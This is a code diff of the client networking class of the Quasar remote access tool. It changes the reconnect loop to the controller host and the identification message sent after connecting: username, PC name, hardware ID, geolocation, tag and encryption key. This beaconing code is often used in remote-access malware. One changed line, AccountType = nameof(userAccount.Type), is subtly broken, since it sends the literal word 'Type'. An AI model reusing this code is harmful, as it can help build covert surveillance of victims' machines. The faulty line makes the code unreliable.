@@ -1,6 +1,9 @@
 ﻿using Quasar.Client.Config;
 using Quasar.Client.Helper;
+using Quasar.Client.IO;
 using Quasar.Client.IpGeoLocation;
+using Quasar.Client.User;
+using Quasar.Common.DNS;
 using Quasar.Common.Helpers;
 using Quasar.Common.Messages;
 using Quasar.Common.Utilities;
@@ -8,8 +11,6 @@ using System;
 using System.Diagnostics;
 using System.Security.Cryptography.X509Certificates;
 using System.Threading;
-using System.Windows.Forms;
-using Quasar.Common.DNS;
 
 namespace Quasar.Client.Networking
 {
@@ -40,21 +41,14 @@ namespace Quasar.Client.Networking
             {
                 if (!Connected)
                 {
-                    Thread.Sleep(100 + _random.Next(0, 250));
-
                     Host host = _hosts.GetNextHost();
 
                     base.Connect(host.IpAddress, host.Port);
-
-                    Thread.Sleep(200);
-
-                    Application.DoEvents();
                 }
 
                 while (Connected) // hold client open
                 {
-                    Application.DoEvents();
-                    Thread.Sleep(2500);
+                    Thread.Sleep(1000);
                 }
 
                 if (Exiting)
@@ -97,17 +91,18 @@ namespace Quasar.Client.Networking
                 // send client identification once connected
 
                 var geoInfo = GeoInformationFactory.GetGeoInformation();
+                var userAccount = new UserAccount();
 
                 client.Send(new ClientIdentification
                 {
                     Version = Settings.VERSION,
                     OperatingSystem = PlatformHelper.FullName,
-                    AccountType = WindowsAccountHelper.GetAccountType(),
+                    AccountType = nameof(userAccount.Type),
                     Country = geoInfo.Country,
                     CountryCode = geoInfo.CountryCode,
                     ImageIndex = geoInfo.ImageIndex,
-                    Id = DevicesHelper.HardwareId,
-                    Username = WindowsAccountHelper.GetName(),
+                    Id = HardwareDevices.HardwareId,
+                    Username = userAccount.UserName,
                     PcName = SystemHelper.GetPcName(),
                     Tag = Settings.TAG,
                     EncryptionKey = Settings.ENCRYPTIONKEY,
